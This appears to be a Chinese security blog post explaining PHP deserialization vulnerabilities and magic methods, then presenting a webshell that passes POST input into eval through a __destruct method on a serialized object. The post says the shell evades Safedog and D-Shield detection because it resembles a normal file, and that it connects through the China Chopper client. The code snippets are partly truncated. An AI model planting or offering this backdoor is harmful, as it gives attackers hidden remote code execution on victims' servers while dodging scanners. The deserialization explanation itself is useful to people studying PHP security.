> Author:vspiders  
>  首发地址：
## 前言
最近和小伙伴们一起研究了下PHP反序列化漏洞，突发奇想，利用反序列化漏洞写一个一句话木马效果应该蛮不错的。于是便有此文。
* * *
## 0x01 PHP反序列化
说起PHP反序列化，那必须先简单说一下PHP的序列化。PHP序列化是将一个对象、数组、字符串等转化为字节流便于传输，比如跨脚本等。而PHP反序列化是将序列化之后的字节流还原成对象、字符、数组等。但是PHP序列化是不会保存对象的方法。
    test);  // 输出对象c中test的值:demo
    ?>
## 0x02 PHP反序列化漏洞
PHP类中有一种特殊函数体的存在叫魔法函数，magic函数命名是以符号 **开头的，比如** construct, **destruct,**
toString, **sleep,** wakeup等等。这些函数在某些情况下会自动调用，比如 **construct当一个对象创建时被调用，**
destruct当一个对象销毁时被调用，__toString当一个对象被当作一个字符串使用。  
而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。
    test;
        }
    }
    $a = $_GET['test'];
    $a_unser = unserialize($a);
    ?>
比如上述代码，构造payload为`http://127.0.0.1:800/test.php?test=O:1:"A":1:{s:4:"test";s:5:"hello";}`  
反序列化后在脚本运行结束时就会调用_destruct函数，同时会覆盖test变量输出hello。
## 0x03 回马枪
我们可以利用该漏洞点，控制输入变量，拼接成一个序列化对象。然后再构造一个魔法函数，比如在_destruct()函数中调用eval执行序列化对象中的语句。
    test);
        }
    }
    $test = $_POST['test'];
    $len = strlen($test)+1;
    $pp = "O:1:\"A\":1:{s:4:\"test\";s:".$len.":\"".$test.";\";}"; // 构造序列化对象
    $test_unser = unserialize($pp); // 反序列化同时触发_destruct函数
    ?>
## 0x04 效果演示
直接菜刀链接：  
安全狗：
此木马毕竟是跟正常文件太像，所以免杀效果很不错。这里只是测试了安全狗、D盾，其余自测。
## 小结
而且由此可以引发很多变形，这里只是利用反序列化漏洞，其他漏洞也可以用来当作木马的载体，毕竟cms的代码执行漏洞在被发现之前，他依旧是一个正常到不能再正常的文件。